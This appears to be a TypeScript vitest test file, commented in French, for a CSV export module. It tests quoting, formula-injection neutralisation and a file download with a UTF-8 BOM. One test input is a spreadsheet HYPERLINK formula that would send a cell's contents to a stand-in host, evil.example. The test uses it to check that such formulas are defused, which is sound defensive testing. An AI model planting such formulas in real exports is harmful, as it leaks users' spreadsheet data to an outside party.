import { describe, it, expect } from "vitest";
import { toCsv, downloadCsv } from "./csv";

describe("toCsv", () => {
  it("échappe guillemets, virgules et retours ; en-têtes français", () => {
    const csv = toCsv([
      { id: 1, url: "https://a.example/x", title: 'Titre, avec "guillemets"' },
      { id: 2, url: "https://b.example/y", title: "Ligne\nmultiple" },
    ]);
    expect(csv).toBe(
      "id;url;titre\n1;https://a.example/x;\"Titre, avec \"\"guillemets\"\"\"\n2;https://b.example/y;\"Ligne\nmultiple\"",
    );
  });

  // Un titre vient d'une page tierce : exécuté comme formule à l'ouverture
  // dans un tableur, il pourrait exfiltrer le voisinage (HYPERLINK, DDE).
  it("neutralise l'injection de formule (= + - @), sans toucher au reste", () => {
    const csv = toCsv([
      { id: 1, url: "https://a.example/x", title: '=HYPERLINK("https://evil.example?d="&B2;"clic")' },
      { id: 2, url: "https://b.example/y", title: "+33 1 23" },
      { id: 3, url: "https://c.example/z", title: "@chose" },
      { id: 4, url: "https://d.example/w", title: "-5 % sur tout" },
      { id: 5, url: "https://e.example/v", title: "Titre ordinaire = sain" },
    ]).split("\n");
    expect(csv[1]).toBe('1;https://a.example/x;"\'=HYPERLINK(""https://evil.example?d=""&B2;""clic"")"');
    expect(csv[2]).toBe("2;https://b.example/y;'+33 1 23");
    expect(csv[3]).toBe("3;https://c.example/z;'@chose");
    expect(csv[4]).toBe("4;https://d.example/w;'-5 % sur tout");
    expect(csv[5]).toBe("5;https://e.example/v;Titre ordinaire = sain");
  });
});

// downloadCsv vit dans le DOM (Blob + ancre) — jsdom n'implémente NI
// createObjectURL NI revokeObjectURL : stubs posés à la main (vi.spyOn
// exige une propriété existante) puis retirés, le temps de ce seul test.
describe("downloadCsv", () => {
  it("préfixe le BOM, nomme l'ancre du fichier, révoque l'URL d'objet", async () => {
    const created: { blob: Blob; url: string }[] = [];
    Object.defineProperty(URL, "createObjectURL", {
      configurable: true,
      value: (blob: Blob) => {
        const url = `blob:csv-${created.length}`;
        created.push({ blob, url });
        return url;
      },
    });
    const revoked: string[] = [];
    Object.defineProperty(URL, "revokeObjectURL", {
      configurable: true,
      value: (url: string) => {
        revoked.push(url);
      },
    });
    const originalClick = HTMLAnchorElement.prototype.click;
    const clicked: HTMLAnchorElement[] = [];
    HTMLAnchorElement.prototype.click = function (this: HTMLAnchorElement) {
      clicked.push(this);
    };

    try {
      downloadCsv("revue.csv", "id;url;titre\n1;https://a.example;Alpha");
    } finally {
      delete (URL as unknown as Record<string, unknown>).createObjectURL;
      delete (URL as unknown as Record<string, unknown>).revokeObjectURL;
      HTMLAnchorElement.prototype.click = originalClick;
    }

    expect(clicked).toHaveLength(1);
    expect(clicked[0]!.download).toBe("revue.csv");
    expect(revoked).toEqual([created[0]!.url]);
    // jsdom n'a pas Blob.prototype.text : lecture par FileReader. Le BOM
    // s'observe sur les OCTETS (EF BB BF) — readAsText le consommerait.
    const bytes = await new Promise<ArrayBuffer>((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(reader.result as ArrayBuffer);
      reader.onerror = () => reject(reader.error);
      reader.readAsArrayBuffer(created[0]!.blob);
    });
    const view = new Uint8Array(bytes);
    expect(created[0]!.blob.type).toBe("text/csv;charset=utf-8");
    expect([...view.slice(0, 3)]).toEqual([0xef, 0xbb, 0xbf]); // BOM UTF-8
    expect(new TextDecoder().decode(view.slice(3))).toBe("id;url;titre\n1;https://a.example;Alpha");
  });
});
